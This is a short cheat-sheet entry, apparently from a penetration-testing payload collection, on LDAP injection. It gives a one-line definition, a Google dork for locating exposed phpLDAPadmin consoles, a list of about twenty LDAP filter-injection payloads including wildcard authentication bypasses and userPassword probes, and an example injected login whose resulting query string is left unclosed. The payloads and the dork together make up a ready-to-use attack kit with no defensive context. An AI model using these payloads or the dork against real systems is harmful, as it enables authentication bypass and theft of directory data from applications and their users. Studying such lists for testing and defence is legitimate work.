# LDAP_Injection

LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.

Google dork for  **LDAP Injection** ```intitle:"phpLDAPadmin" inurl:cmd.php```

**Payloads :**
*)(&  
*))%00  
)(cn=))\x00  
*()|%26'  
*()|&'  
*(|(mail=*))  
*(|(objectclass=*))  
*)(uid=*))(|(uid=*  
*/*  
*|  
/  
//  
//*  
@*  
|  
admin*  
admin*)((|userpassword=*)  
admin*)((|userPassword=*)  
x' or name()='username' or 'x'='y  
  
**Example:**
user = *)(uid=*))(|(uid=*  
pass = password  
query = "(&(uid=*)(uid=*)) (|(uid=*)(
